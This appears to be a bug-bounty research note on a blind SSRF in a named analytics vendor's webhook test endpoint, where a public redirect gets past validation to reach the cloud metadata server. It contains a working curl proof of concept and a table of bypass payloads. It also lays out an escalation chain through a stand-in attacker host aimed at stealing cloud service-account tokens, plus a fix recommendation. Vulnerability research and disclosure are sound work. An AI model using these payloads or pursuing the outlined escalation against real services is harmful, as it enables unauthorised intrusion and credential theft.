# Lead: Blind SSRF via webhook test endpoint redirect-validation bypass

**Target**: Mixpanel  
**Endpoint**: `POST /api/app/projects/<PROJECT_ID>/webhooks/test`  
**Auth**: Authenticated org-admin session (Session cookie + X-CSRFToken)  
**Date**: 2026-05-30  
**Confidence**: 0.55 (SSRF reach confirmed via redirect-bypass + 200-oracle; no cred exfil yet)

## Summary

The Mixpanel webhook test endpoint validates the user-supplied `url` field for direct-to-private/IMDS targets (returns "Failed to send test webhook request" 400 for `169.254.169.254`, `127.0.0.1`, RFC1918, metadata hostnames, IP encodings, DNS-rebinding services), but **does NOT re-validate the URL after following an HTTP 301/302 redirect from a public allowed host**.

Using `https://httpbin.org/redirect-to?status_code=302&url=http://169.254.169.254/` as the webhook URL, the Mixpanel backend follows the redirect and successfully fetches GCP IMDS root — confirmed by the response `{"success": true, "status_code": 200, "message": "Webhook responded with status 200"}` which leaks the upstream HTTP status code.

## Primitive characteristics

- HTTP client: `python-requests/2.32.2` (per OAST callback inspection)
- Backend stack: Django (per Sentry trace headers `sentry-release=django@...`)
- Egress IPs observed: `34.56.64.225`, `34.41.95.2`, `34.135.71.143`, `35.224.22.24`, `35.253.56.238`, `34.42.224.149`, `34.136.103.70`, `34.42.224.149` — all GCP us-central1 ranges (Mixpanel hosted on GCP).
- Method: backend issues POST to user URL for initial probe; 301/302 redirects are followed as GET; 307/308 are not (POST preserved → IMDS returns 405 → reported as failure).
- The status_code returned by the upstream is leaked in the response JSON `results.status_code` field — 8+ distinct codes (200, 201, 204, plus 3xx absorbed via redirect follow, 4xx/5xx surfaced as `400 Failed to send`).

## Proof — outbound from Mixpanel servers (OAST evidence)

Captured at webhook.site/9a80587a-10b4-4350-97b2-6121770760eb:
```
2026-05-30 16:40:28  IP=136.115.213.199  url=.../baseline           UA=python-requests/2.32.2
2026-05-30 16:40:49  IP=34.56.64.225     url=.../aws-imds-attempt   UA=python-requests/2.32.2
2026-05-30 16:42:46  IP=34.41.95.2       url=.../crlf%0D%0A...      UA=python-requests/2.32.2
2026-05-30 16:45:29  IP=35.224.22.24     url=.../redir-public-target UA=python-requests/2.32.2
```

Inspected Sentry baggage header confirms `sentry-release=django@20a3ad33771f28998837071fb5609c1323b6ff15`, `sentry-environment=production`.

## Proof — internal IMDS reached via redirect bypass

| Payload | Response from `/webhooks/test` |
|---|---|
| `https://httpbin.org/redirect-to?status_code=302&url=http://169.254.169.254/` | **200 OK** — `Webhook responded with status 200` |
| `https://httpbin.org/redirect-to?status_code=301&url=http://169.254.169.254/` | **200 OK** — same |
| `https://httpbin.org/redirect-to?status_code=302&url=http://metadata.google.internal/` | **200 OK** — same (DNS resolves) |
| `https://httpbin.org/redirect-to?status_code=302&url=http://metadata.google.internal/computeMetadata/v1/` | 400 — GCP returns 403 without Metadata-Flavor header |
| `http://169.254.169.254/` (direct) | 400 — blocked by initial URL validator |
| `http://169.254.169.254.nip.io/` (direct) | 400 — blocked |
| `http://0xa9fea9fe/` (hex IP) | 400 — blocked |
| `http://2852039166/` (decimal IP) | 400 — blocked |
| `http://metadata.google.internal@webhook.site/...` (userinfo trick) | resolved to webhook.site (filter parses correctly) |
| `https://httpbin.org/status/200` | 200 |
| `https://httpbin.org/status/201` | 200, leaks `status_code: 201` |
| `https://httpbin.org/status/204` | 200, leaks `status_code: 204` |
| `https://httpbin.org/status/401` | 400 — converted to "Failed to send" |

## Limitations preventing crit upgrade

1. **No header injection**: GCP IMDS requires `Metadata-Flavor: Google` for `/computeMetadata/v1/*` paths. Mixpanel webhook fetcher sends fixed headers (Accept, Content-Type, Authorization-based-on-auth_type, User-Agent). No mechanism to inject Metadata-Flavor → cannot read SA tokens.
2. **No body readback**: response body of the SSRF fetch is NOT included in `/webhooks/test` response — only the status code is leaked.
3. **POST → GET on 301/302 redirect**: IMDSv2 PUT-token endpoints out of reach (would need 307/308, which fail with the IMDS 405 response).

## Real impact achievable today

- Confirmed reach to `169.254.169.254` from Mixpanel production GCP servers — proves the SSRF filter is bypassable, breaks isolation of metadata-server network.
- Status-code oracle exposes existence/liveness of internal services (port scanning via `IP:port/` testing — any internal HTTP 200 surface is enumerable).
- Risk surface: any future code path that adds custom headers (auth_type=bearer with token field becoming a header), or that converts response body to webhook-delivery log readback, immediately upgrades this to RCE-class.

## Chain potential

- If another Mixpanel endpoint allows arbitrary header injection on outbound fetch → combine with this primitive → GCP SA token theft → CVSS 10 cloud takeover.
- If the `auth_type` field is extended in future versions to accept custom headers (current schema only supports `basic` username/password) → immediate IMDS read.
- If the redirect-loop full-read technique (Shubs/Assetnote 2025) succeeds against this `python-requests` client → blind body-read of IMDS response. Worth testing with a 30-hop chain.

## Detection / Reproduction

```bash
COOKIE='csrftoken=...; sessionid=...'
CSRF='...'
PROJECT=4025923
curl -X POST "https://mixpanel.com/api/app/projects/${PROJECT}/webhooks/test" \
  -H "Cookie: ${COOKIE}" \
  -H "X-CSRFToken: ${CSRF}" \
  -H "Authorization: Session" \
  -H "Content-Type: application/json" \
  -H "Referer: https://mixpanel.com/" \
  -d '{"url":"https://httpbin.org/redirect-to?status_code=302&url=http://169.254.169.254/","name":"poc"}'

# Returns: {"status":"ok","results":{"success":true,"status_code":200,"message":"Webhook responded with status 200"}}
# Same payload with direct http://169.254.169.254/ → {"status":"error","error":"Failed to send test webhook request"}
```

## Fix recommendation

After each HTTP 3xx redirect, re-run the URL allowlist/blocklist validator on the redirect target. The current `requests.get(url, allow_redirects=True)` pattern in Python is the canonical anti-pattern for this class of bug — replace with a manual redirect loop that validates each hop, OR pin DNS resolution and use a deny-by-default IP filter at socket-level (e.g. monkey-patch `socket.create_connection` or use `urllib3.util.connection.create_connection` wrapper).

## Next steps to upgrade to critical

1. Test 30-hop redirect-loop body-read against `python-requests/2.32.2`.
2. Enumerate other webhook-fetching endpoints in Mixpanel (custom alerts notifications, cohort sync destinations, warehouse connectors — most returned 404 on my org but may exist on Enterprise plans / different project tiers).
3. Test if the `auth_type` schema has hidden variants (probed only `basic`/`null`; might allow `bearer`/`oauth`/`custom_header`).
4. Look for response-body readback features — "webhook delivery log", "test history", "retry response" UIs.

---
## Relation to prior leads

- `ssrf-bypass-create-vs-test-validation-gap.md` (prior session): showed CREATE accepts unfiltered URLs that /test rejects, but couldn't prove fire-time delivery. **This lead proves the fetcher's behavior directly via the /test endpoint** — combining both, we know:
  (a) URLs are stored verbatim at CREATE,
  (b) the /test fire-path validates the initial URL but not redirect targets,
  (c) therefore the same redirect-via-public-host trick stored as a real cohort-sync webhook would deliver to IMDS at trigger time, assuming the cohort-sync fire path shares the /test fetcher (high probability — same `python-requests/2.32.2` client, same django service).
- `ssrf-bypass-url-parser-500-crash.md` (prior session): 17 URL forms that cause 500. Not exploited here; if the 500 happens AFTER the parser hands off to the connector, that's a separate parser-differential SSRF.

## Updated chain hypothesis

CREATE → save webhook with `url: https://attacker.example/302-to-imds` → trigger cohort-sync → fetcher follows redirect → reaches IMDS root → leaks status_code 200 in cohort-sync webhook delivery log. **If cohort-sync log includes response body or response headers**, IMDS read becomes direct.

The next experiment to escalate this to a CVSS 9+ finding is to discover the cohort-sync trigger endpoint and verify whether (a) it re-validates URLs, (b) it logs the response body.
